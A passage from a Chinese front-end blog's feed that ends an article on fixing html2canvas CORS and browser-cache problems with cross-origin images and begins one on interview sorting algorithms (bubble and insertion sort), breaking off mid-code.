时具体发生了什么"></a>开启 useCORS 时具体发生了什么</h3><p><code>useCORS</code> 表示是否尝试使用 CORS 从服务器加载图像，默认为 <code>false</code>。当设置为 <code>true</code> 时，html2canvas 将跨域图片绘制到 canvas 上时，会为其添加 <code>crossorigin</code> 属性：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// html2canvas/src/core/cache-storage.ts</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_">isInlineBase64Image</span>(src) || useCORS) &#123;</span><br><span class="line">img.<span class="property">crossOrigin</span> = <span class="string">&#x27;anonymous&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">img.<span class="property">src</span> = src;</span><br></pre></td></tr></table></figure><p>这样请求的图片就会尝试从服务端获取跨域头，确认安全后，图片就正常渲染在画布上。关于具体的图片请求，与 img 标签设置了 <code>crossorigin=&quot;anonymous&quot;</code> 属性后发起的请求是一致的，具体看后文。</p><h3 id="allowTaint-和-useCORS-设置后的具体表现"><a href="#allowTaint-和-useCORS-设置后的具体表现" class="headerlink" title="allowTaint 和 useCORS 设置后的具体表现"></a>allowTaint 和 useCORS 设置后的具体表现</h3><table><thead><tr><th>allowTaint</th><th>useCORS</th><th>存在跨域资源时调用 <code>toDataURL</code> 时的表现</th></tr></thead><tbody><tr><td>false</td><td>false</td><td>控制台不会报错，但是输出的图像上跨域图片的位置为空白</td></tr><tr><td>true</td><td>false</td><td>控制台会报画布被污染的错误，html2canvas Promise 会走到 catch</td></tr><tr><td>true</td><td>true</td><td>将图片的 crossorigin 设置为 anonymous 后，如果服务器允许跨域，则图片正常被渲染</td></tr><tr><td>false</td><td>true</td><td>当 <code>allowTaint</code> 为 <code>false</code> 时，但是开启了 <code>useCORS</code>,也会加载跨域图片，表现与上面一致</td></tr></tbody></table><h1 id="3-受访问的服务器必须支持-CORS"><a href="#3-受访问的服务器必须支持-CORS" class="headerlink" title="3. 受访问的服务器必须支持 CORS"></a>3. 受访问的服务器必须支持 CORS</h1><p>如果请求的资源不支持返回跨域头，那么无论 html2canvas 如何配置，画布上都无法渲染出图片，控制台也会输出 CORS 的错误。</p><p>以百度云的对象存储 BOS 为例，创建 bucket 后可以在『配置管理』的『跨域访问CORS配置』中对跨域头进行配置：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/2bcec13c6f822e1eca9c7c4b448d578f.png" alt=""></p><p>此外如果启用了 CDN，也需要检查 『CDN 详情』- 『访问控制』-『跨域访问配置』中是否也允许了跨域：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202403271959966.png" alt=""></p><p>配置了跨域访问后，如果能够发起一个跨域请求，那么响应头中应该存在 CORS 的相关字段：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202403272002517.png" alt=""></p><h1 id="4-为-img-标签添加-crossorigin-属性"><a href="#4-为-img-标签添加-crossorigin-属性" class="headerlink" title="4. 为 img 标签添加  crossorigin 属性"></a>4. 为 img 标签添加  crossorigin 属性</h1><p>在解决方案的第3条『为 img 标签添加 <code>crossorigin=&quot;anonymous&quot;</code> 属性』，那么接下来我们就来解释以下这个行为发生了什么，以及为什么要这么做。</p><h3 id="corssorigin-”anonymous”-做了什么"><a href="#corssorigin-”anonymous”-做了什么" class="headerlink" title="corssorigin=”anonymous” 做了什么"></a>corssorigin=”anonymous” 做了什么</h3><p>当我们不添加这个属性时，发送的图片请求为：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://esunr-webapp.cdn.bcebos.com/express-vue-template/playground/mountain.webp?freshKey=1711520456453&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;accept-language: zh-CN,zh;q=0.9&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;referer: http://172.24.136.200:5173/&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;123&quot;, &quot;Not:A-Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;123&quot;&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;sec-ch-ua-mobile: ?0&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;sec-ch-ua-platform: &quot;macOS&quot;&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;sec-fetch-dest: image&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;sec-fetch-mode: no-cors&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;sec-fetch-site: cross-site&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36&#x27;</span></span><br></pre></td></tr></table></figure><p>添加了这个属性后发送的图片请求为：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://esunr-webapp.cdn.bcebos.com/express-vue-template/playground/mountain.webp?freshKey=1711520795407&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;accept-language: zh-CN,zh;q=0.9&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;origin: http://172.24.136.200:5173&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;referer: http://172.24.136.200:5173/&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;123&quot;, &quot;Not:A-Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;123&quot;&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;sec-ch-ua-mobile: ?0&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;sec-ch-ua-platform: &quot;macOS&quot;&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;sec-fetch-dest: image&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;sec-fetch-mode: cors&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;sec-fetch-site: cross-site&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36&#x27;</span></span><br></pre></td></tr></table></figure><p>将请求进行 Diff：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+ &#x27;origin: http://172.24.136.200:5173&#x27;</span></span><br><span class="line"><span class="deletion">- &#x27;sec-fetch-mode: no-cors&#x27;</span></span><br><span class="line"><span class="addition">+ &#x27;sec-fetch-mode: cors&#x27;</span></span><br></pre></td></tr></table></figure><p>发现添加 <code>crossorigin=&quot;anonymous&quot;</code> 属性后会添加一个 <code>origin</code> 与 <code>sec-fetch-mode</code> 的请求头，来告诉服务端获取的是一个跨域资源，当 BOS 接收到这个请求头后，会将响应的 <code>Access-Control-Allow-Origin</code> 字段设置为与 <code>origin</code> 同值。换句话说，<code>origin</code> 字段决定了 BOS 返回资源的 <code>Access-Control-Allow-Origin</code> 字段的值，<strong>如果请求头中没有 <code>origin</code> 字段，BOS 会返回一个错误的、被 CDN 缓存的，或者没有 <code>Access-Control-Allow-Origin</code> 响应头的响应</strong>。我们也都应知道，<code>Access-Control-Allow-Origin</code> 只有匹配当前域时，CORS 策略才会通过，否则跨域资源就会加载失败。</p><h3 id="为什么要设置-corssorigin-”anonymous”"><a href="#为什么要设置-corssorigin-”anonymous”" class="headerlink" title="为什么要设置 corssorigin=”anonymous”"></a>为什么要设置 corssorigin=”anonymous”</h3><p>那接下来我们来解释以下为什么在 img 标签中添加这个属性，其与浏览器的本地缓存是相关的。</p><p>假设我们没有设置这个属性，那么浏览器发起图片请求时，返回的图片是一个不带 CORS 相关响应头的资源，浏览器收到这个图片请求后便会将这个资源缓存在本地。当我们调用 html2canvas 时，其会加载相同的资源，那么再加载这张跨域图片后便是从浏览器缓存中取了这个没有 CORS 相关响应头的资源，那这就会导致将图片加载在 Canvas 上时出现 CORS 错误，如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202403272026051.png" alt=""></p><p>浏览器整体的请求流程图如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202403272040393.png" alt=""></p><p>当为 img 标签添加了 <code>crossorigin=&quot;anonymous&quot;</code> 属性后，浏览器在加载 HTML 中的图片时便会去请求一个携带了 CORS 相关响应头的图片，那么浏览器缓存的图片资源也就是带了跨域头的。那么后面调用 html2canvas 在离屏 canvas 中加载图片时，获取的缓存图片就是符合规格的了，那么就不会出现 CORS 错误了。流程图如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202403272059883.png" alt=""></p><h1 id="5-来自其他页面的缓存"><a href="#5-来自其他页面的缓存" class="headerlink" title="5. 来自其他页面的缓存"></a>5. 来自其他页面的缓存</h1><p>在上一章节中，我们解释了设置 <code>crossorigin=&quot;anonymous&quot;</code> 是为了防止当前页面缓存一个没有 CORS 相关响应头的图片资源，在大多数情况下已经可以正常工作了。但当我们在其他页面页面或域加载了相同的图片资源时，他们所创建的缓存还是会影响到 html2canvas 的图片渲染的，这点需要特别注意。</p><h3 id="来自同站点的图片缓存"><a href="#来自同站点的图片缓存" class="headerlink" title="来自同站点的图片缓存"></a>来自同站点的图片缓存</h3><p>拿具体的示例来说，假如同一张图片出现在了当前网站的其他页面，但是使用该张图片的 img 标签未添加 <code>corssorigin</code> 属性，那么浏览器又会缓存一个没有 CORS 相关响应头的图片资源，导致 html2canvas 的图片渲染失败，同时网站内其他使用了相同图片并为 img 添加了 <code>corssorigin</code>  属性位置的图片也会加载失败，流程图如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202403281410292.png" alt=""></p><h3 id="来自同域的缓存"><a href="#来自同域的缓存" class="headerlink" title="来自同域的缓存"></a>来自同域的缓存</h3><p>此外还有一种情况需要额外注意，在浏览器缓存中，<strong>相同一级域名下的图片缓存，在子域名之间是会互相复用的</strong>，比如在域名 <code>local.baidu.com</code> 访问了图片 <code>mountain.webp</code>，那么在域名 <code>local2.baidu.com</code> 下访问相同的图片 <code>mountain.webp</code> 时，就会去获取第一次访问 <code>local.baidu.com</code> 时创建的缓存，即使两个域名的 img 标签都添加了 <code>corssorigin</code> 属性，但拿到的缓存图片响应头中的 <code>Access-Control-Allow-Origin</code> 是错误的，就仍然会造成 CORS 错误，流程图如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202403281653329.png" alt=""></p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p><strong>方案一：</strong></p><p>如果想要避免同站点缓存一张没有 CORS 响应头的资源，那么就要为所有 html2canvas 调用到的图片，在其同站点任何位置的 img 标签都添加上 <code>corssorigin</code> 属性，那这样自然就不会缓存错误的图片资源了，但这其实也并不算很严谨，因为你不知道这种行为什么时候就会被破坏。</p><p><strong>方案二：</strong></p><p>如果确实会遇到来自同域的缓存，方案一就不适用了，我们可以尝试是否能让服务端返回的图片资源，在遇到跨域请求时始终携带 <code>Access-Control-Allow-Origin: *</code> 的响应头，这样即使使用了其他域的缓存资源，由于其缓存的 <code>Access-Control-Allow-Origin</code> 值为通配符 <code>*</code>，那么在当前站点仍符合 CORS 策略，可以被正常加载。</p><p>以 BOS 为示例，在『配置管理』-『跨域访问CORS配置』中，默认的值为 <code>https://* http://*</code>，这代表 BOS 如果遇到跨域请求，会将 <code>Access-Control-Allow-Origin</code> 动态设置为请求头 <code>origin</code> 字段的值。我们需要将其改为 <code>*</code> 后保存，这样 BOS 在收到跨域请求时就不会进行判断，而是恒返回一个 <code>*</code>。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202403281545753.png" alt=""></p><p>配置完成后请求图片：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202403281550019.png" alt=""></p><p>但是这样我们仍要保证站点内所有 html2canvas 调用的图片都得是跨域请求（也就是所有 img 标签都得有 <code>crossorigin</code> 属性），但是如果使用了 CDN 便可避免这一问题。CDN 支持自定义响应头，那么我们只要在 CDN 上添加 <code>Access-Control-Allow-Origin: *</code> 的响应头即可无论是否是跨域请求，都会携带该响应头，因此浏览器中缓存的资源始终都是合法的跨域资源，那么接下来 html2canvas 的操作便没有任何问题了，具体设置入口在 CDN 管理面板中，设置方式如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202403281553149.png" alt=""></p><p><strong>方案三：</strong></p><p>如果我们在已有的项目中实在不好去变动 Bucket 的设置，那我们为了保证 html2canvas 渲染不出错，就只能强行让 html2canvas 获取的图片不使用缓存，也就是每次访问的都是一张新图片。为了避免使用缓存，可以在图片的 src 后面追加一个时间戳作为 query，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">:src</span>=<span class="string">&quot;`https://xxx/mountain.webp?timestamp=$&#123;new Date().valueOf()&#125;`&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>但这样的话，浏览器的图片缓存机制就会失效，并且如果使用了 CDN，每次请求都会触发回源，出于性能表现上是不太推荐这样做的。</p><p><strong>也许还有一种解决方案？</strong></p><p>html2canvas 上还存在一个配置项 <code>onclone</code>，表示在克隆 DOM 进行渲染时调用的函数，其本质是用于在不修改原始 DOM 的状态下对在 Canvas 上渲染的内容进行修改。那么我们就可以尝试是否能在正常的页面上请求不跨域的图片，然后在 <code>onclone</code> 函数中请求跨域图片，同时修改图片的 src 为其后缀一个时间戳，让其渲染在 Canvas 上时不使用缓存，代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">html2canvas</span>(renderAreaRef.<span class="property">value</span>, &#123;</span><br><span class="line">  <span class="attr">allowTaint</span>: html2canvasOptions.<span class="property">allowTaint</span>,</span><br><span class="line">  <span class="attr">useCORS</span>: html2canvasOptions.<span class="property">useCORS</span>,</span><br><span class="line">  <span class="attr">onclone</span>: <span class="function">(<span class="params">doc</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> images = doc.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">    images.<span class="title function_">forEach</span>(<span class="function">(<span class="params">img</span>) =&gt;</span> &#123;</span><br><span class="line">      img.<span class="title function_">setAttribute</span>(<span class="string">&#x27;crossorigin&#x27;</span>, <span class="string">&#x27;anonymous&#x27;</span>);</span><br><span class="line">      <span class="keyword">const</span> imgSrc = img.<span class="title function_">getAttribute</span>(<span class="string">&#x27;src&#x27;</span>);</span><br><span class="line">      img.<span class="title function_">setAttribute</span>(<span class="string">&#x27;src&#x27;</span>, <span class="string">`<span class="subst">$&#123;imgSrc&#125;</span>?timestamp=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().valueOf()&#125;</span>`</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">canvas</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> img = canvas.<span class="title function_">toDataURL</span>(<span class="string">&#x27;image/png&#x27;</span>);</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 导出图片</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title class_">ElMessage</span>.<span class="title function_">error</span>(<span class="string">&#x27;生成图片失败，查看控制台错误&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(e);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>但是经过尝试后，Canvas 上会绘制出来一张空白图片，因此这个方案可能暂时不适用：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202403281647507.png" alt=""></p><p>但是如果使用 css 属性 <code>backgroundImage</code> 来加载图片却可以使用该方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">html2canvas</span>(renderAreaRef.<span class="property">value</span>, &#123;</span><br><span class="line">  <span class="attr">allowTaint</span>: html2canvasOptions.<span class="property">allowTaint</span>,</span><br><span class="line">  <span class="attr">useCORS</span>: html2canvasOptions.<span class="property">useCORS</span>,</span><br><span class="line">  <span class="attr">onclone</span>: <span class="function">(<span class="params">doc</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> images = doc.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.need-print-img&#x27;</span>);</span><br><span class="line">    images.<span class="title function_">forEach</span>(<span class="function">(<span class="params">img</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> backgroundImageUrl = (</span><br><span class="line">        img <span class="keyword">as</span> <span class="title class_">HTMLDivElement</span></span><br><span class="line">      ).<span class="property">style</span>.<span class="property">backgroundImage</span>.<span class="title function_">replace</span>(<span class="regexp">/url\(([&#x27;&quot;])?(.*?)\1\)/gi</span>, <span class="string">&#x27;$2&#x27;</span>);</span><br><span class="line">      <span class="keyword">const</span> newImageUrl = <span class="string">`<span class="subst">$&#123;backgroundImageUrl&#125;</span>&amp;timestamp=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().valueOf()&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 使用跨域请求预加载 image 图片</span></span><br><span class="line">      <span class="keyword">const</span> _img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">      _img.<span class="property">crossOrigin</span> = <span class="string">&#x27;anonymous&#x27;</span>;</span><br><span class="line">      _img.<span class="property">src</span> = newImageUrl;</span><br><span class="line"></span><br><span class="line">      (img <span class="keyword">as</span> <span class="title class_">HTMLDivElement</span>).<span class="property">style</span>.<span class="property">backgroundImage</span> = <span class="string">`url(<span class="subst">$&#123;_img.src&#125;</span>)`</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">canvas</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> img = canvas.<span class="title function_">toDataURL</span>(<span class="string">&#x27;image/png&#x27;</span>);</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 导出图片</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title class_">ElMessage</span>.<span class="title function_">error</span>(<span class="string">&#x27;生成图片失败，查看控制台错误&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(e);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>但是使用 css 来展示图片既不合常规，也会导致 html2canvas 渲染模糊，总之还是不太推荐。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> HTML2Canvas </tag>
            
            <tag> 跨域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试中常见的排序算法总结</title>
      <link href="/2024/03/d7594c17df2c.html"/>
      <url>/2024/03/d7594c17df2c.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-冒泡排序"><a href="#1-冒泡排序" class="headerlink" title="1. 冒泡排序"></a>1. 冒泡排序</h1><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/b7bd2041f90b4a6aa3720c9ea07e4a0c~tplv-k3u1fbpfcp-zoom-in-crop-mark_1512_0_0_0.gif" alt=""></p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>解法一（推荐去看解法二）：</p><p>从第一个元素开始向后进行比较，在一轮比较的过程中，通过持续交换元素位置，将更大的元素推向后方。sortedIndex 表示已经排序好的元素，不参与内部的第二次循环。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">babelSort</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span> - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> sortedIndex = arr.<span class="property">length</span> - <span class="number">1</span> - i</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; sortedIndex; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">        [arr[j], arr[j + <span class="number">1</span>]] = [arr[j + <span class="number">1</span>], arr[j]];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">起始输入：</span><br><span class="line">[5, 2, 3, 1]</span><br><span class="line">length = 4</span><br><span class="line"></span><br><span class="line">排序过程：</span><br><span class="line">i = 0; sortedIndex = 3;</span><br><span class="line">j = 0; 5 &gt; 2 === true =&gt; [*5*, *2*, 3, 1] -&gt; [*2*, *5*, 3, 1]</span><br><span class="line">j = 1; 5 &gt; 3 === true =&gt; [2, *5*, *3*, 1] -&gt; [2, *3*, *5*, 1]</span><br><span class="line">j = 2; 5 &gt; 1 === true =&gt; [2, 3, *5*, *1*] -&gt; [2, 3, *1*, *5*]</span><br><span class="line"></span><br><span class="line">i = 1; sortedIndex = 2;</span><br><span class="line">j = 0; 2 &gt; 3 === false =&gt; [*2*, *3*, 1, 5] -&gt; [*2*, *3*, 1, 5]</span><br><span class="line">j = 1; 3 &gt; 1 === true =&gt; [2, *3*, *1*, 5] -&gt; [2, *1*, *3*, 5]</span><br><span class="line"></span><br><span class="line">i = 2; sortIndex = 1;</span><br><span class="line">j = 0; 2 &gt; 1 === true; [*2*, *1*, 3, 5] -&gt; [*1*, *2*, 3, 5]</span><br></pre></td></tr></table></figure><p>解法二：</p><p>拿 <code>arr[i]</code> 与后面的数进行对比，如果比后面的数大，就将后面的数放到前面，也就是将最小的数放到前面。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">firstBabelSort</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span> - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; arr.<span class="property">length</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arr[i] &gt; arr[j]) &#123;</span><br><span class="line">        [arr[i], arr[j]] = [arr[j], arr[i]];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">起始输入：</span><br><span class="line">[5, 2, 3, 1]</span><br><span class="line"></span><br><span class="line">排序过程：</span><br><span class="line">i = 0</span><br><span class="line">j = 1; 5 &gt; 2 === true; [(5),(2),3,1] -&gt; [(2),(5),3,1]</span><br><span class="line">j = 2; 2 &gt; 3 === false; [(2),5,(3),1] -&gt; [(2),5,(3),1]</span><br><span class="line">j = 3; 2 &gt; 1 === true; [(2),5,3,(1)] -&gt; [(1),5,3,(2)]</span><br><span class="line"></span><br><span class="line">i = 1</span><br><span class="line">j = 2; 5 &gt; 3 === true; [1,(5),(3),2] -&gt; [1,(3),(5),2]</span><br><span class="line">j = 3; 3 &gt; 2 === true; [1,(3),5,(2)] -&gt; [1,(2),5,(3)]</span><br><span class="line"></span><br><span class="line">i = 2</span><br><span class="line">j = 3; 5 &gt; 3 === true; [1,2,(5),(3)] -&gt; [1,2,(3),(5)]</span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：O(n^2)</li><li>空间复杂度：O(1)</li></ul><h3 id="稳定性"><a href="#稳定性" class="headerlink" title="稳定性"></a>稳定性</h3><blockquote><p>稳定性：在一个排序序列中，如果有两个相同的记录，若经过排序后，这些记录的相对顺序仍保持不变，即在原序列中如果 A1 === A2 且 A1 位于 A2 之前，在排序后 A1 仍位于 A2 之前，那么这个算法被称为是稳定的。</p></blockquote><p>稳定，当遇到相同元素时冒泡算法不会交换两个元素的位置。</p><h3 id="最坏情况"><a href="#最坏情况" class="headerlink" title="最坏情况"></a>最坏情况</h3><p>待排序的序列是逆序的情况下，冒泡排序需要比较和交换的次数最多。</p><h1 id="2-插入排序"><a href="#2-插入排序" class="headerlink" title="2. 插入排序"></a>2. 插入排序</h1><p>插入排序的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。类似与扑克牌排序：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202403231751882.png" alt=""></p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/insertionSort.gif" alt=""></p><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">insertSort</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; 